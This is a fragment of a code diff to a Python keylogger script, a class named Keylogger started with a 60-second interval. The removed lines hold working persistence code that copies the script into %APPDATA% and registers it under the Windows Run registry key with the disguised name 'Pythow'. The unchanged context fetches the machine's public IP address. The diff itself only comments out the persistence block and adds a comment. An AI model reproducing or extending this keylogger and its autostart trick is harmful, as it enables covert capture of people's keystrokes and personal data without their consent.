@@ -38,18 +38,18 @@ else:
           except FileExistsError:
                  pass
 
-if os.path.exists(os.environ["appdata"] +'\\'+os.path.basename(__file__)):
-    pass
-else:
-     if not os.path.exists(os.environ["appdata"] +'\\'+os.path.basename(__file__)):
-            #pass
-            try:
-                path = os.getcwd()+'\\'+os.path.basename(__file__)
-                copy_path_new= shutil.copy(path,os.environ["appdata"])
-                copy_path = os.environ["appdata"]+'\\'+os.path.basename(__file__)
-                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Pythow /t REG_SZ /d "' +copy_path + '"',shell=True )
-            except FileExistsError:
-                 pass
+#if os.path.exists(os.environ["appdata"] +'\\'+os.path.basename(__file__)):
+ #   pass
+#else:
+ #    if not os.path.exists(os.environ["appdata"] +'\\'+os.path.basename(__file__)):
+ #           pass
+ #           try:
+ #              path = os.getcwd()+'\\'+os.path.basename(__file__)
+ #               copy_path_new= shutil.copy(path,os.environ["appdata"])
+ #              copy_path = os.environ["appdata"]+'\\'+os.path.basename(__file__)
+ #               subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Pythow /t REG_SZ /d "' +copy_path + '"',shell=True )
+ #          except FileExistsError:
+ #               pass
 
 try:
     public_ip  = urllib.request.urlopen('http://api.ipify.org').read().decode('utf8')
@@ -301,6 +301,6 @@ class Keylogger:
                 
 if __name__=='__main__':
   
-   Keylogger = Keylogger(60)
+   Keylogger = Keylogger(60) # set the time by sacond  seconds
    Keylogger.GO_START()            
                         
